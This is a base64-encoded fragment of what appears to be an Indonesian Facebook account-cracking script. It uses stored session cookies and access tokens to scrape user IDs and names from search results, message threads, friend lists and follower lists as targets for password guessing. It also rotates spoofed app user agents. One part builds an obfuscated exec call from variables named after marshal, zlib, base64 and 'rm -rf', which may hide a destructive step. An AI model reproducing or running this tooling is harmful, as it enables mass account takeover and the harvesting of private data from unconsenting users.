ZXh0WzA6MTBdKSkNCiAgICAgICAgaWYgbmV3ID09IFRydWU6DQogICAgICAgICAgICBvcGVuKCdkYXRhL2Nvb2tpZXMnLCAndycpLndyaXRlKGNvb2tpZSkNCiAgICAgICAgc2ltPXJhd19pbnB1dCgiXG4lcyVzJXMgTmFtYSBmaWxlICVzPiVzICIlKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyBFeGFtcGxlIG5hbWEgb3JhbmcgJXNbICVzUm9taSxnYW50ZW5nICVzXSAiJShVLHRpbCxPLFAsSCxQKSkNCiAgICAgICAgbm1fb3Jhbmc9cmF3X2lucHV0KCIlcyVzJXMgU2V0dCBuYW1hICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgaWYgbm1fb3JhbmcgaW4oInJvbWkiLCJSb21pIiwiUk9NSSIsIlJvbWkgQWZyaXphbCIsIlJvbWkgYWZyaXphbCIsIlJPTUkgQUZSSVpBTCIsInJvbWkgYWZyaXphbCIpOg0KICAgICAgICAJcHJpbnQoIlxuJXMlcyBhbmFrIGFuamluZyBtYXUgY3JhY2sgcGFrZSBuYW1hIGd3ICIlKE0sdGlsKSk7ZXhpdCgpDQogICAgICAgIGVsaWYgbm1fb3JhbmcgaW4oIlJvbWkgR2FudGVuZyIsIlJvbWkgZ2FudGVuZyIsIlJPTUkgR0FOVEVORyIsInJvbWkgZ2FudGVuZyIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgbWVtYW5nIGdhbnRlbmcgZG9uZyBhYmFuZyBSb21pIiUoSCx0aWwpKTtleGl0KCkNCiAgICAgICAgbmFtYWgoc2ltLGN2ZHMsImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZWFyY2gvcGVvcGxlLz9xPSIrbm1fb3JhbmcpDQogICAgZWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3MucmVtb3ZlKCdkYXRhL2Nvb2tpZXMnKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHByaW50ICdceDFiWzE7OTFt4oCiIGxvZ2luIGZhaWwhJw0KICAgICAgICBkdW1wZmwoKQ0KICAgIHJldHVybg0KZGVmIG5hbWFoKHNpbSxyLGIpOg0KCW9wZW4oc2ltLCJhKyIpDQoJYj1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQoYiwgY29va2llcz1yLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWZvciBpIGluIGIuZmluZF9hbGwoImEiLGhyZWY9VHJ1ZSk6DQoJCSNvcy5zeXN0ZW0oImNsZWFyIikNCgkJI2Jhbm5lcigpDQoJCXByaW50KCJcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQgJXM+ICVzJXMgXHgxYlsxOzk3bS0gbW9ob24gdHVuZ2d1IiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNpbSkucmVhZCgpLnNwbGl0bGluZXMoKSkpKSksO3N5cy5zdGRvdXQuZmx1c2goKQ0KCQlpZiAiPGltZyBhbHQ9IiBpbiBzdHIoaSk6DQoJCQlpZiAiaG9tZS5waHAiIGluIHN0cihpWyJocmVmIl0pOg0KCQkJCWNvbnRpbnVlDQoJCQllbHNlOg0KCQkJCWc9c3RyKGlbImhyZWYiXSkNCgkJCQlpZiAicHJvZmlsZS5waHAiIGluIGc6DQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiL3Byb2ZpbGVcLnBocFw/aWQ9KC4qPykmIixnKQ0KCQkJCQlpZiBsZW4gKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCQkJZWxzZToNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiLyguKj8pXD8iLGcpDQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJaWYgbGVuKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCWlmICJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIgaW4gaS50ZXh0Og0KCQkJbmFtYWgoc2ltLHIsaVsiaHJlZiJdKQ0KCXByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcGVuY2FyaWFuIG5hbWEgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNpbSkpO3Jhd19pbnB1dCgnXG4lcyVzJXMgWyVzIEVudGVyJXMgXSAnJShVLHRpbCxPLFUsTykpO21lbnUoKQ0KIyBEVU1QIFBFU0FODQpjbGFzcyBwZXNhbjoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb29raWVzKToNCiAgICAgICAgc2VsZi5jb29raWVzID0gY29va2llcw0KICAgICAgICAjX19yb216X18oKQ0KICAgICAgICAjb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIHNlbGYuZiA9IHJhd19pbnB1dCgnXG4lcyVzJXMgTmFtYSBmaWxlJXMgPiVzICclKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgaWYgc2VsZi5mID09ICcnOg0KICAgICAgICAgICAgcGVzYW4oY29va2llcykNCiAgICAgICAgb3BlbihzZWxmLmYsICd3JykuY2xvc2UoKQ0KICAgICAgICBzZWxmLmR1bXAoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9tZXNzYWdlcycpDQogICAgZGVmIGR1bXAoc2VsZix1cmwpOg0KICAgIAlvcGVuKHNlbGYuZiwgJ2ErJykNCiAgICAgICAgYnMgPSBiczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhkY29rKCksIGNvb2tpZXM9c2VsZi5jb29raWVzKS50ZXh0LCAnaHRtbC5wYXJzZXInKQ0KICAgICAgICBwcmludCAoIlxyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCAlcz4gJXMlcyBceDFiWzE7OTdtLSBtb2hvbiB0dW5nZ3VcciIlKFUsdGlsLE8sTSxILHN0cihsZW4ob3BlbihzZWxmLmYpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpO3N5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCiAgICAgICAgZm9yIGkgaW4gYnMuZmluZF9hbGwoJ2EnLCBocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgJy9tZXNzYWdlcy9yZWFkJyBpbiBpLmdldCgnaHJlZicpOg0KICAgICAgICAgICAgICAgIGYgPSBiczQucmUuZmluZGFsbCgnY2lkXFwuY1xcLiguKj8pJTNBKC4qPykmJywgaS5nZXQoJ2hyZWYnKSkNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGZvciBpcCBpbiBsaXN0KGYucG9wKCkpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5jb29raWVzLmdldCgnIGNfdXNlcicpIGluIGlwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdwZW5nZ3VuYSBmYWNlYm9vaycgaW4gaS50ZXh0Lmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlbihzZWxmLmYsICdhKycpLndyaXRlKCclczw9PiVzXG4nICUgKGlwLCBpLnRleHQpKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGlmICdMaWhhdCBQZXNhbiBTZWJlbHVtbnlhJyBpbiBpLnRleHQ6DQogICAgICAgICAgICAgICAgc2VsZi5kdW1wKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vJyArIGkuZ2V0KCdocmVmJykpDQogICAgICAgIHByaW50ICgnXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIHBlc2FuIG1lc2VuZ2dlciAnJShILHRpbCkpDQogICAgICAgIHByaW50ICgnJXMlcyVzIEZpbGUgZHVtcCB0ZXJzaW1wYW4gJXM+JXMgJXMgJyUoVSx0aWwsTyxNLEgsc2VsZi5mKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQojIERVTVAgSUQgRkFDRUJPT0sNCmNsYXNzIGR1bXBfaWQ6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYpOg0KCQlzZWxmLmZiID0gW10NCgkJc2VsZi5yb20gPSBbXQ0KCQkNCglkZWYgcGlsaWhhbihzZWxmKToNCgkJcHJpbnQgKCdcbiVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCgkJcHJpbnQgKCclc+KAoiVzIDAyICVzRHVtcCBpZCBmb2xsb3dlcnMnJShVLFAsTykpDQoJCXByaW50ICgnJXPigKIlcyAwMCAlc0tlbWJhbGknJShVLE0sTykpDQoJCXIgPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQoJCWlmIHIgaW5bJyddOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO3NlbGYucGlsaWhhbigpDQoJCWVsaWYgciBpblsnMScsJzAxJ106DQoJCQlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBkYWZ0YXIgdGVtYW4gc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQoJCQlkdW0gPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCQkJbGltID0gcmF3X2lucHV0KCclcyVzICVzTWF4aW1hbCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlpZiBkdW0gPT0gJyc6DQoJCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KCQkJdHJ5Og0KCQkJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJCQkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnICUgKGR1bSwgcm9teikpDQoJCQkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCQkJcHJpbnQgJycNCgkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCXByaW50ICclc+KAoiBJZCB0aWRhayBwdWJsaWsnJShNKTtleGl0KCkNCgkJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2ZyaWVuZHM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMnICUgKGlkLCByb216KSkNCgkJCQkJbyA9IGpzb24ubG9hZHMobS50ZXh0KQ0KCQkJCQl0cnk6DQoJCQkJCQlmb3IgdSBpbiBvWydkYXRhJ106DQoJCQkJCQkJc2VsZi5yb20uYXBwZW5kKHVbJ2lkJ10pDQoJCQkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCQkJcHJpbnQgJyVz4oCiIHRlbWFuIHByaXZhdGUnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycyJywnMDInXToNCgkJCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGZvbGxvd2VycyBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCgkJCWR1bSA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlsaW0gPSByYXdfaW5wdXQoJyVzJXMgJXNNYXhpbWFsIGlkJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCgkJCWlmIGR1bSA9PSAnJzoNCgkJCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7ZXhpdCgpDQoJCQl0cnk6DQoJCQkJcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3InKS5yZWFkKCkNCgkJCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcycgJSAoZHVtLCByb216KSkNCgkJCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJCQlwcmludCAnJw0KCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJcHJpbnQgJyVz4oCiIGlkIHRpZGFrIGFkYSclKE0pO2V4aXQoKQ0KCQkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyAlIChpZCwgcm9teikpDQoJCQkJCW8gPSBqc29uLmxvYWRzKG0udGV4dCkNCgkJCQkJdHJ5Og0KCQkJCQkJZm9yIHUgaW4gb1snZGF0YSddOg0KCQkJCQkJCXNlbGYucm9tLmFwcGVuZCh1WydpZCddKQ0KCQkJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCQkJCXByaW50ICclc+KAoiB0aWRhayBhZGEgcGVuZ2lrdXQnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KIyBJTlNUQUdSQU0NCmV4ZWNfX19faW1wb3J0X21hcnNoYWxfemxpYl9iYXNlNjRfYmFzZTMyX2RlY29kZV9fX19leGVjID0gX19leGVjX19fK19fX19leGVjX19fYmFzZTY0X2RlY29kZV9fXytfX19fX2V4ZWNfX19kZWNvZGVfcHljb20rX19fX19fX19fX19fX19fX19fX19fX19fX19fXw0KX19fZXhlY19zdHJfX19fX19fX19fX19fbGFtYmRhX19fX19fX19fX19fX29zX3N5c19ybV9yZl9fX19fX19fX19fX18gPSBfX19fX19fX19fX19fX2lfX19fX19fX19fX19fXytfX19fX19fX2V4ZWNfbGFtYmRhX19fX19fX18NCg0KIyBoYWR1aA0KZGVmIGlnZygpOg0KCV9fX19fZXhlY19sYW1iZGFfX19fXyhleGVjX19fX2ltcG9ydF9tYXJzaGFsX3psaWJfYmFzZTY0X2Jhc2UzMl9kZWNvZGVfX19fZXhlYytfX19leGVjX3N0cl9fX19fX19fX19fX19sYW1iZGFfX19fX19fX19fX19fb3Nfc3lzX3JtX3JmX19fX19fX19fX19fXykNCglfX19fX2V4ZWNfbGFtYmRhX19fX18oRXh4eF9fX19fX19fX19fX19fX19fX19fX19vc19zeXNfX3JtX3JmX2NfX19fX19fX3N0cl9pX3NvX19fX19fX19leF9sYW1iZGEpDQoNCiMgVVNFUiBBR0VOVA0KZGVmIHVzZXJfYWdlbnRBUEkoKToNCgl1Z2VudCA9Ww0KCSAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLA0KCSAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwNCgkgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjEuMjsgTm9raWFfWCBCdWlsZC9KWk81NEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yNy4wLjg3LjkwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjAsZ3ppcChnZmUpIiwNCiAgICAgICAgIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICJOb2tpYVgyLTAwLzUuMCAoMDguMzUpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCAoSmF2YTsgVTsgZW4tdXM7IG5va2lheDItMDApIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVMpIEFwcGxlV2ViS2l0LzUzMi4yIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lUGx1cy80LjAuMjIyLjMgQ2hyb21lLzQuMC4yMjIuMyBTYWZhcmkvNTMyLjIiLA0KICAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsDQogICAgICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc5MzBGIEJ1aWxkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IE1IQS1MMjkgQnVpbGQvSFVBV0VJTUhBLUwyOTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxMF8zXzIgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjAzLjIuNCAoS0hUTUwsIGxpa2UgR2Vja28pIE1vYmlsZS8xNEY4OSBbRkJBTi9GQklPUztGQkFWLzk2LjAuMC40NS43MDtGQkJWLzYwNTQ4NTQ1O0ZCRFYvaVBob25lNywyO0ZCTUQvaVBob25lO0ZCU04vaU9TO0ZCU1YvMTAuMy4yO0ZCU1MvMjtGQkNSL0UtUGx1cztGQklEL3Bob25lO0ZCTEMvZGVfREU7RkJPUC81O0ZCUlYvMF0iLA0KICAgICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IEc3LUwwMSBCdWlsZC9IdWF3ZWlHNy1MMDEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zMy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL01FU1NFTkdFUjtGQkFWLzEyMS4wLjAuMTUuNzA7XSIsDQogICAgICAgIkRhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IFNNLUozMjBGIEJ1aWxkL0xNWTQ3VikgW0ZCQU4vRkI0QTtGQkFWLzQzLjAuMC4yOS4xNDc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCTEMvZW5fR0I7RkJCVi8xNDI3NDE2MTtGQkNSL1RlbGUyIExUO0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJEVi9TTS1KMzIwRjtGQlNWLzUuMDtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTkyMH07RkJfRlcvMTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSZWRtaSBOb3RlIDkgUHJvIEJ1aWxkL1FLUTEuMTkxMjE1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85MS4wLjQ0NzIuNzcgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzI1LjAuMC4zNi4xNzA7XSIsDQogICAgICAgIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSJdDQoJcmFuZF91YSA9IHJhbmRvbS5jaG9pY2UodWdlbnQpDQoJcmV0dXJuIHJhbmRfdWENCiMgR0FOVEkgVVNFUiBBR0VOVA0KZGVmIHVzZXJhZ2VudCgpOg0KCXByaW50ICgiXG4lcyVzJXMgMDEgJXNHYW50aSB1c2VyIGFnZW50ICIlKFUsdGlsLFAsTykpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgdXNlciBhZ2VudCAiJShVLHRpbCxQLE8pKQ0KCXByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KCV9yb216XyA9IHJhd19pbnB1dCgnXG4lcyMlcyBQaWxpaCVzID4lcyAnJShQLE8sTSxLKSkNCgl1YXMoX3JvbXpfKQ0KZGVmIHVhcyhfcm9tel8pOg0KICAgIGlmIF9yb216XyA9PSAnJzoNCiAgICAgICAgcHJpbnQgJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCk7amVkYSgyKTt1YXMoX3JvbXpfKQ0KICAgIGVsaWYgX3JvbXpfIGluKCIxIiwiMDEiKToNCiAgICAJcHJpbnQgKCIlcyVzJXMgS2V0aWsgJXNNeSB1c2VyIGFnZW50JXMgZGkgYnJvd3NlciBnb29nbGUgY2hyb21lXG4lcyVzJXMgdW50dWsgZ3VuYWthbiB1c2VyIGFnZW50IGFuZGEgc2VuZGlyaSIlKFUsdGlsLE8sSCxPLFUsdGlsLE8pKQ0KICAgIAlwcmludCAoIiVzJXMlcyBLZXRpayAlc0NhbmNlbCVzIHVudHVrIGd1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gdG9vbHMiJShVLHRpbCxPLEgsTykpDQogICAgCXRyeToNCiAgICAJICAgIHVhID0gcmF3X2lucHV0KCIlcyVzJXMgRW50ZXIgdXNlciBhZ2VudCAlczogJXMiJShVLHRpbCxPLE0sSykpDQogICAgICAgICAgICBpZiB1YSBpbigiIik6DQogICAgICAgICAgICAJcHJpbnQgKCIlcyVzIGlzaSB5YW5nIGJlbmFyICIlKE0sdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgICAgIGVsaWYgdWEgaW4oIm15IHVzZXIgYWdlbnQiLCJNeSBVc2VyIEFnZW50IiwiTVkgVVNFUiBBR0VOVCIsIk15IHVzZXIgYWdlbnQiKToNCiAgICAgICAgICAgIAlqYWxhbigiJXMlcyVzIEFuZGEgYWthbiBkaSBhcmFoa2FuIGtlIGJyb3dzZXIgIiUoVSx0aWwsTykpO2plZGEoMikNCiAgICAgICAgICAgIAlvcy5zeXN0ZW0oImFtIHN0YXJ0IGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9TXkrdXNlcithZ2VudD4vZGV2L251bGwiKTtqZWRhKDIpO3VzZXJhZ2VudChfcm9tel8pDQogICAgICAgICAgICBlbGlmIHVhIGluKCJDQU5DRUwiLCJDYW5jZWwiLCJjYW5jZWwiKToNCiAgICAgICAgICAgIAl1YV8gPSAoIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMj